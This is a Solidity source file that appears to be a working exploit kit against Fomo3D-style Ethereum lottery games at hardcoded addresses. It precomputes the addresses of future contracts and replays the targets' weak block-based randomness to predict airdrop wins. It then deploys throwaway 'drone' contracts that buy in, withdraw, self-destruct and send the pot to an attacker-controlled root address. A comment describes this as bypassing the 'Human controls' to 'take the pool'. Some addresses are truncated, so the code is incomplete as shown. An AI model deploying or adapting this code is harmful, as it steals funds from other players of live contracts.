pragma solidity ^0.4.24;
interface FoMo3DInterface {
  function airDropTracker_() external returns (uint256);
  function airDropPot_() external returns (uint256);
  function buyXaddr(address,uint256) payable external;
  function withdraw() external;
}
interface LiveAgentInterface {
    function AgentdeployAgent(bytes ) external returns (address deployedAddress);
    function AgentdeployDrone(bytes ) external payable  returns (address deployedAddress);
}
interface ControllerInterface {
    function viewDx() external returns (address[] deployedAgents, uint256[] deployedNonce);
    function getAgents() external returns (address[] deployedAgents, uint256[] deployedNonce);
    function setAgents(address[] deployedAgents, uint256[] deployedNonce) external returns (uint256 num);
    function AgentdeployDrone(bytes ) external payable  returns (address deployedAddress);
}
/* * -functionhash- 0x8f38f309 (using ID for affiliate)
     * -functionhash- 0x98a0871d (using address for affiliate)
     * -functionhash- 0xa65b37a1 (using name for affiliate)
*/
// Team allocation structures
// 0 = whales
// 1 = bears
// 2 = sneks
// 3 = bulls
contract ProtoDrone{
    using SafeMath for *;
    function() public payable { }
    constructor() public payable {
        owner_ = msg.sender;
        }
    function byebye() public  {
        noFomoHD_root_.transfer(address(this).balance);   
        selfdestruct(noFomoHD_root_);   
    }   
    function sendhome() public {
        noFomoHD_root_.transfer(address(this).balance);   
    }        
    function ping() public pure returns(bool) {
        return(true);   
    }        
    modifier onlyByOwner() {
        require(msg.sender == noFomoHD_root_ || msg.sender == owner_ );
        _;}
    address owner_ = msg.sender;
    address constant noFomoHD_root_ = address(0x000006A....);
//    address constant nofomohd_affID_ = address(0xCafEB....);
}

/* PROTOTYPE Drones for different targets */
// "Fomo3DLong" - 0x76e1dd35
// "Fomo3DLongTest - 0x76e1dd35
// "Fomo3DShort" - 0x404455cb
// "FomoHDPatch - 0xcdc3c7b2
// "FomoHackAttack" - 0x53b518a4
// droneCreate(0x2e0e5331,"0xA62142888ABa8370742bE823c1782D17A0389Da1")
contract DroneFomo3DLong is ProtoDrone{
    function() public payable {
        }
        constructor() public payable {
         owner_ = msg.sender;
         address(this).call.gas(5000000).value(msg.value);
         fomo3d.buyXaddr.value(msg.value)(nofomohd_affID_,3);
         fomo3d.withdraw();
        selfdestruct(noFomoHD_root_);   
    }
    address owner_;
    FoMo3DInterface fomo3d = FoMo3DInterface(FomoTarget_);
    address constant private FomoTarget_ = address(0xA62142888ABa8370742bE823c1782D17A0389Da1); // "Fomo3DLong" - 0x76e1dd35
    address constant nofomohd_affID_ = address(0xCafEB...);
}
// "FoMo3Dshort" - 0x8facfc7e
// droneCreate(0x8facfc7e,"0x4e8ecF79AdE5e2C49B9e30D795517A81e0Bf00B8")
contract DroneFomo3DShort is ProtoDrone{
    function() public payable {

        }
        constructor() public payable {
         owner_ = msg.sender;
         address(this).call.gas(5000000).value(msg.value);
         fomo3d.buyXaddr.value(msg.value)(nofomohd_affID_,3);
         fomo3d.withdraw();
        selfdestruct(noFomoHD_root_);   
    }
    address owner_;
    FoMo3DInterface fomo3d = FoMo3DInterface(FomoTarget_);
    address constant private FomoTarget_ = address(0x4e8ecF79AdE5e2C49B9e30D795517A81e0Bf00B8); // "Fomo3DShort" - 0x404455cb
    address constant nofomohd_affID_ = address(0xCafEB...); // nofomohd
}
// Last Winner
// "LastWinner" - 0x53b518a4
// droneCreate(0x8facfc7e,"0xDd9fd6b6F8f7ea932997992bbE67EabB3e316f3C")
contract DroneFomoHackAttack is ProtoDrone{
    function() public payable {

        }
        constructor() public payable {
         owner_ = msg.sender;
         address(this).call.gas(5000000).value(msg.value);
         fomo3d.buyXaddr.value(msg.value)(nofomohd_affID_,3);
         fomo3d.withdraw();
        selfdestruct(noFomoHD_root_);   
    }
    address owner_;
    FoMo3DInterface fomo3d = FoMo3DInterface(FomoTarget_);
    address constant private FomoTarget_ = address(0xDd9fd6b6F8f7ea932997992bbE67EabB3e316f3C); // "LastWinner" - 0x53b518a4
    address constant nofomohd_affID_ = address(0xCafEB...); // nofomohd
}
// "Bingo4Beast" - 0x53b518a4
// droneCreate(0x8facfc7e,"0xDd9fd6b6F8f7ea932997992bbE67EabB3e316f3C")
contract DroneFomoBingo4Beast is ProtoDrone{
    function() public payable {

        }
        constructor() public payable {
         owner_ = msg.sender;
         address(this).call.gas(5000000).value(msg.value);
         fomo3d.buyXaddr.value(msg.value)(nofomohd_affID_,3);
         fomo3d.withdraw();
        selfdestruct(noFomoHD_root_);   
    }
    address owner_;
    FoMo3DInterface fomo3d = FoMo3DInterface(FomoTarget_);
    address constant private FomoTarget_ = address(0x05AA2fdf9f58B426B49900834cce0565D88E52EB); // "Bingo4Beast"
    address constant nofomohd_affID_ = address(0xCafEB...); // nofomohd
}
// need to add 	F3DPLUS - 0x0f90ef4e2526E3D1791862574f9Fb26A0f39eC86
// need to add "Bingo4Beast" - 0x05AA2fdf9f58B426B49900834cce0565D88E52EB 
contract DroneFomoHackAttackDD is ProtoDrone{
    function() public payable {

        }
        constructor() public payable {
         owner_ = msg.sender;
         address(this).call.gas(5000000).value(msg.value);
         fomo3d.buyXaddr.value(msg.value)(nofomohd_affID_,3);
         fomo3d.withdraw();
         fomo3d.buyXaddr.value(100000000000000000)(nofomohd_affID_,3);
         fomo3d.withdraw();
        selfdestruct(noFomoHD_root_);   
    }
    address owner_;
    FoMo3DInterface fomo3d = FoMo3DInterface(FomoTarget_);
    address constant private FomoTarget_ = address(0xDd9fd6b6F8f7ea932997992bbE67EabB3e316f3C); // "FomoHackAttackDD" - 0x53b518a4
    address constant nofomohd_affID_ = address(0xCafEB...); // nofomohd
}
//*******************************
//  Live Agent will deploy the next drone according to the Agent controller
//  New contract code is dynamically deployed from the contract using inline assembly
//*******************************
contract LiveAgent is ProtoDrone{
    function() public payable { }
    constructor() public payable {
        owner_ = msg.sender;
    }
    function AgentdeployAgent(bytes code) public returns (address deployedAddress) {
        assembly {
          deployedAddress := create(0, add(code, 0x20), mload(code))
          jumpi(0xfd, iszero(extcodesize(deployedAddress))) // jumps if no code at addresses
        }
        emit agentDeployed(deployedAddress);
        return deployedAddress;
    }
    function AgentdeployDrone(bytes code) public payable  returns (address deployedAddress){
        uint256 v = msg.value;
        assembly {
          deployedAddress := create(v, add(code, 0x20), mload(code))
          //jumpi(0xfd, iszero(extcodesize(deployedAddress))) // jumps if no code at addresses
        }
        emit droneDeployed(deployedAddress);
        return deployedAddress;
    }
    function byebye() public  {
        noFomoHD_root_.transfer(address(this).balance);   
        selfdestruct(noFomoHD_root_);   
    }   
    function sendhome() public {
        noFomoHD_root_.transfer(address(this).balance);   
    }        
    function ping() public pure returns(bool) {
        return(true);   
    }        
    modifier onlyByOwner() {
        require(msg.sender == noFomoHD_root_ || msg.sender == owner_ );
        _;}
    address private owner_ = msg.sender;
    event agentDeployed(address deployedAddress);
    event droneDeployed(address deployedAddress);
}

//*******************************
// The Agent controller creates new agents, so that the agent contract addresses 
// are deterministic and can be computed with the embedded algorithm
//*******************************
contract TheAgentController is LiveAgent {
    using SafeMath for *;
    //
    // "LiveAgent" - 0xd3be7c8f
    function agentUpload(string _agentname,bytes _agentcode)
        onlyByOwner public
        returns (bytes4) {
            bytes4 _agentID = hashName(_agentname);
            agentcode_[_agentID] = _agentcode;
            emit uploadAgentCode(msg.sender,_agentID,_agentcode.length);
            return _agentID;
    }
    function agentCreate(string _agentname, uint _num) onlyByOwner public  {
        bytes4 _agentID = hashName(_agentname);
        if (agentcode_[_agentID].length == 0) revert();
        for (uint i=0;i<= _num;i++){
            address newAgentAddress = AgentdeployAgent(agentcode_[_agentID]);
            Dx_.push(newAgentAddress); IDx_[newAgentAddress] = Dx_.length;
            nextNonce_[newAgentAddress] = 1;
            emit createdAgent(newAgentAddress, msg.sender,block.number);
        }
    }
    function getAgents() public constant returns(address[],uint256[]){
        uint256[] memory nonceTemp = new uint256[](Dx_.length);
        uint i;
        for (i=0; i< Dx_.length; i++){
            nonceTemp[i] = nextNonce_[Dx_[i]];
        }
        return(Dx_,nonceTemp);   
    }
    function setAgents(address[] _existingAgent,uint256[] _existingNonce) onlyByOwner public  {
        uint256 i;
        for (i=0; i < _existingAgent.length ; i++){
             address newAgentAddress = _existingAgent[i];
             uint256 newNonce = _existingNonce[i];
             Dx_.push(newAgentAddress); IDx_[newAgentAddress] = Dx_.length;
             nextNonce_[ newAgentAddress ] = newNonce;
        }
        //emit migratedAgent( Dx_.length);
    }
    function migrateController(address _fromControllerAddress) onlyByOwner public {
        ControllerInterface oldCtrl_ = ControllerInterface(_fromControllerAddress);
        (address[] memory x,uint256[] memory y) = oldCtrl_.getAgents();
        setAgents( x,y );
    }
    function agentPause(address _toAgent) onlyByOwner public {
        nextNonce_[_toAgent] = 0;
    }
    function agentResume(address _toAgent,uint256 _nextNonce) onlyByOwner public {
        nextNonce_[_toAgent] = _nextNonce;
    }
    function droneUpload(string _gamename,string _dronename,bytes _dronecode)
        onlyByOwner public
        returns (bytes4) {
            bytes4 _droneID = hashName(_dronename);
            address _Fomo3D_target = GAMES_[hashName(_gamename)];
            dronecode_[_droneID] = _dronecode;
            emit uploadDroneCode(msg.sender,_droneID,_dronecode.length);
            return _droneID;
    }
    function droneCreate(bytes4 _droneID,address _fromAgent) payable onlyByOwner public  {
        if (dronecode_[_droneID].length == 0) revert();
        bytes memory c = dronecode_[_droneID];
        nextNonce_[_fromAgent] += 1;
        address newDroneAddress = LiveAgent(_fromAgent).AgentdeployDrone.value(msg.value)(c);
        emit deployedDrone(newDroneAddress, msg.sender,block.number);
        // kamakazi dronecode_
        //Drone(newDroneAddress).byebye();
    }
    // Fomo3DLong - 0x76e1dd35
    // Fomo3DShort - 0x404455cb
    // FomoHDPatch - 0xcdc3c7b2
    // FomoHackAttack - 0x53b518a4
    function scanAirdropAgents(string _gamename, string _dronename) public payable returns(address _newDrone){
        //set local fomo3d insteface ---
        address _Fomo3D_target = GAMES_[hashName(_gamename)];
        LiveAgentInterface _agent ;
        FoMo3DInterface _fomo3d = FoMo3DInterface(_Fomo3D_target);
        if(_fomo3d.airDropTracker_()==0){revert();}
        if( testAirdropAgents(_gamename)==0 ){revert();}
        uint i;
        uint num=0;
        uint256 _tracker = _fomo3d.airDropTracker_();
        for (i=0; i<Dx_.length ; i++){
            if(checkAirdrop( nextAddress( Dx_[i],nextNonce_[Dx_[i]] ), _fomo3d.airDropTracker_() ) == true){
                nextNonce_[Dx_[i]] += 1;
                num++;
                _agent = LiveAgentInterface(Dx_[i]);
                address newDroneAddress = _agent.AgentdeployDrone.value(msg.value)(dronecode_[hashName(_dronename)]);
                emit deployedDrone(newDroneAddress, msg.sender,block.number);
                // kamakazi dronecode_
                //Drone(newDroneAddress).byebye();
                return(newDroneAddress);
            }
        }
        revert();
        emit scanComplete(num, Dx_.length,_tracker);
        return(0x00);    
    }
    //
    // This checks to see if the drone address will bypass the Human controls and take the pool
    function checkAirdrop(address _currentAddress, uint256 _tracker) private constant returns (bool){
    {
        uint256 seed = uint256(keccak256(abi.encodePacked(
            (block.timestamp).add
            (block.difficulty).add
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
            (block.gaslimit).add
            ((uint256(keccak256(abi.encodePacked(_currentAddress)))) / (now)).add
            (block.number)
            
        )));
        if((seed - ((seed / 1000) * 1000)) < _tracker)
            return(true);
        else
            return(false);
    }}
    function testAirdropAgents(string _gamename) constant public returns (uint256){
        uint i;
        uint num=0;
        //set local fomo3d interface ---
        address _Fomo3D_target = GAMES_[hashName(_gamename)];
        FoMo3DInterface _fomo3d = FoMo3DInterface(_Fomo3D_target);
        uint256 air = _fomo3d.airDropTracker_();
        for (i=0; i<Dx_.length ; i++){
            if( checkAirdrop(nextAddress(Dx_[i],nextNonce_[Dx_[i]]),air) == true){
                num++;
            }
        }
        return (num);    
    }
    function hashName(string _name) public constant returns (bytes4) {
        //return sha3(_name);
        return bytes4(keccak256(abi.encodePacked(_name))); 
    }

    // This is the heart of this contract.  Computes the next contract address that a given contract will generate once deployed
    function nextAddress(address _currentAddress, uint _nonce) public pure returns (address) {
        if(_nonce == 0x00)     return address(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _currentAddress, byte(0x80))));
        if(_nonce <= 0x7f)     return address(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), _currentAddress, byte(_nonce))));  //127 nonce
        if(_nonce <= 0xff)     return address(keccak256(abi.encodePacked(byte(0xd7), byte(0x94), _currentAddress, byte(0x81), uint8(_nonce)))); //255 nonce
        if(_nonce <= 0xffff)   return address(keccak256(abi.encodePacked(byte(0xd8), byte(0x94), _currentAddress, byte(0x82), uint16(_nonce)))); 
        if(_nonce <= 0xffffff) return address(keccak256(abi.encodePacked(byte(0xd9), byte(0x94), _currentAddress, byte(0x83), uint24(_nonce)))); //16777215
        return address(keccak256(abi.encodePacked(byte(0xda), byte(0x94), _currentAddress, byte(0x84), uint32(_nonce)))); // more than 2^32 nonces not realistic
    }

    function viewAirdropParams(string _gamename) public constant returns (uint256,uint256,uint256,uint256,address,uint256,uint256, uint256){
        //set local fomo3d insteface ---
        address _Fomo3D_target = GAMES_[hashName(_gamename)];
        FoMo3DInterface _fomo3d = FoMo3DInterface(_Fomo3D_target);
        return(_fomo3d.airDropTracker_(), _fomo3d.airDropPot_(),block.timestamp, block.difficulty,block.coinbase,block.gaslimit,block.number,now);
    }

    function zaddGame(string _gamename, address _Fomo3D_target) public onlyByOwner{
        GAMES_[hashName(_gamename)]  = address(_Fomo3D_target); 
    }
    modifier onlyByOwner() {
        require(msg.sender == noFomoHD_root_ || msg.sender == owner_ );
        _;}
    constructor(){
        GAMES_[hashName("Fomo3DLong")]  = address(0xA62142888ABa8370742bE823c1782D17A0389Da1); 
        GAMES_[hashName("Fomo3DShort")]  = address(0x4e8ecF79AdE5e2C49B9e30D795517A81e0Bf00B8); 
        GAMES_[hashName("FomoHackAttack")]  = address(0xDd9fd6b6F8f7ea932997992bbE67EabB3e316f3C); 
    }
    mapping (bytes4 => bytes) public agentcode_;
    mapping (bytes4 => bytes) public dronecode_;
    address private owner_ = msg.sender;
    mapping (bytes4 => address) public GAMES_;
    // Fomo3DLong - 0x76e1dd35
    // Fomo3DShort - 0x404455cb
    // FomoHDPatch - 0xcdc3c7b2
    // FomoHackAttack - 0x53b518a4
    address constant private noFomoHD_root_ = address(0x000006....);
    //address constant private Fomo3D_target_ = Fomo3DLong_target_;
    //FoMo3DInterface private fomo3d_ = FoMo3DInterface(Fomo3D_target_);

    address[] Dx_ ; 
    mapping (address => uint256 ) public IDx_;
    mapping (address => uint256 ) public nextNonce_;
    //address[] Dy_ ;
    
  event scanComplete(uint256 scanAgents, uint256 totalAgents, uint256 airDropTracker);
  event createdAgent(address createdAt, address indexed owner, uint256 genesisBlock);
  event migratedAgent(uint256 count);
  event deployedDrone(address deployedAt, address indexed owner, uint256 genesisBlock);
  event uploadAgentCode(address uploadedBy,bytes4 AgentID, uint256 codeLength);
  event uploadDroneCode(address uploadedBy,bytes4 DroneID, uint256 codeLength);
}
library SafeMath{
    function add(uint256 a, uint256 b)
    internal
    pure
    returns (uint256 c) {
        c = a + b;
        require(c >= a, "SafeMath add failed");
        return c;
    }
}
